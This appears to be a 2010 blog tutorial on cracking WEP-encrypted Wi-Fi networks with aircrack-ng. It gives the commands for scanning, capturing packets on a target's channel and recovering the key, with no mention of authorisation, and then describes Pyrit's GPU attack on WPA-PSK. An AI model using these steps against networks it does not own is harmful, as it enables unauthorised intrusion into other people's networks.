---
comments: true
date: "2010-04-03T17:29:24Z"
slug: hack-wireless-network
tags:
- Aircrack-ng
- Debian
- Network Security
- Ubuntu
- WEP
- Wi-Fi
- WPA
categories:
- Linux
- Network Security
title: How to Hack a Wireless Network
wordpress_id: 22
---

[WEP](https://en.wikipedia.org/wiki/Wired_Equivalent_Privacy) was intended to provide comparable confidentiality to a traditional wired network (in particular it does not protect users of the network from each other, but from outsiders), hence the name WEP.

Despite the intention, several serious weaknesses were identified by [cryptanalysts](https://en.wikipedia.org/wiki/Cryptanalysis) over the last years. The severity of the weaknesses means that any WEP protected network can be cracked using the right software within two minutes or less.

WEP was superseded by [Wi-Fi Protected Access](https://en.wikipedia.org/wiki/Wi-Fi_Protected_Access) (also known as WPA) in 2003, and then by the full [IEEE 802.11i](https://en.wikipedia.org/wiki/IEEE_802.11i-2004) standard (also known as WPA2) in 2004. Despite the weaknesses, WEP provides a level of security that can deter casual snooping.

**Hack Versus Crack**

For your information - just to get the right jargon.

The Eric S. Raymonds [Jargon File](http://www.catb.org/jargon) contains a bunch of definitions of the term "[hacker](https://en.wikipedia.org/wiki/Hacker_%28computer_security%29)", most having to do with technical adeptness and a delight in solving problems and overcoming limits. The basic difference between a hacker and a cracker is this: hackers build things, crackers break them.

**Howto Conduct The Actual Crack**

It's fairly easy to [crack](https://en.wikipedia.org/wiki/Password_cracking) a [WEP](https://en.wikipedia.org/wiki/Wired_Equivalent_Privacy) encrypted [wireless network](https://en.wikipedia.org/wiki/Wi-Fi), because the [WEP encryption](https://en.wikipedia.org/wiki/Wired_Equivalent_Privacy) has some serious flaws in its design, flaws that makes it easy and fast to [crack](https://en.wikipedia.org/wiki/Password_cracking) or hack.

Install [aircrack-ng](https://www.aircrack-ng.org/) - on Debian or Ubuntu by:


    sudo aptitude install aircrack-ng


Then start aircrack-ng to look for wireless networks:


    sudo airodump-ng eth1

Then notice the channel number of the wireless network you want to crack.

    CH  1 ][ Elapsed: 9 mins ][ 2012-08-19 18:35

    BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

    70:71:BC:A6:FF:FF  -68      285      191    0   4  54e  WEP  WEP         wifi-0
    00:17:9A:F1:FF:FF  -77      599      104    0   6  54 . WEP  WEP         wifi-1
    4C:E6:76:C4:FF:FF  -38      926       60    0   2  54e  WPA2 CCMP   PSK  wifi-2
    C4:3D:C7:34:FF:FF  -62      476      397    0   8  54e  WPA  TKIP   PSK  wifi-3


Quit aircrack-ng and start it again with med specific channel number to collect packages faster:


    sudo airodump-ng -c 4 -w dump eth1


Then wait and let it collect about 500K IVS and the try the do the actual crack:


    sudo aircrack-ng -b 0a:0b:0c:0d:0e:0f dump-01.cap


The MAC after the -b option is the BSSID of the target and dump-01.cap the file containing the captured packets.

**Only WEP Encrypted Networks**

Keep in mind that this approach is only usable in relation to WEP encrypted wireless networks, and cannot be used to crack WPA and WPA2 encrypted networks.

However, there is a new project called [Pyrit](https://code.google.com/p/pyrit/),which is currently under it's way. Pyrit takes a step ahead in attacking WPA-PSK and WPA2-PSK, the protocol that today de-facto protects public [WIFI](https://en.wikipedia.org/wiki/Wi-Fi)-airspace. The project's goal is to estimate the real-world security provided by these protocols. Pyrit does not provide [binary](https://en.wikipedia.org/wiki/Binary_file) files or wordlists and does not encourage anyone to participate or engage in any harmful activity. This is a research project, not a cracking tool - keep that in mind ;-)

Pyrit's implementation allows to create massive databases, pre-computing part of the WPA/WPA2-PSK authentication phase in a space-time-tradeoff. The performance gain for real-world-attacks is in the range of three orders of magnitude which urges for re-consideration of the protocol's security. Exploiting the computational power of [GPUs](https://en.wikipedia.org/wiki/Graphics_processing_unit), this is currently by far the most powerful attack against one of the world's most used security-protocols.
